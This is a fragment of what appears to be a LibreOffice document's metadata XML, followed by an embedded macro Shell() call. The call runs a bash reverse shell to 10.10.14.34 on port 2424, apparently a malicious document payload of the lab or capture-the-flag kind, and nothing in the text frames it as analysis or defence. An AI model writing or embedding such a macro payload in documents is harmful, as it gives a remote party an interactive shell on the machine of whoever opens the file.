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2:32:54.926360171</meta:creation-date>
    <dc:date>2023-11-18T02:46:42.208762886</dc:date>
    <meta:editing-duration>PT13M45S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/7.5.8.2$Linux_X86_64 LibreOffice_project/5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Shell("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.34/2424 0&gt;&amp;1'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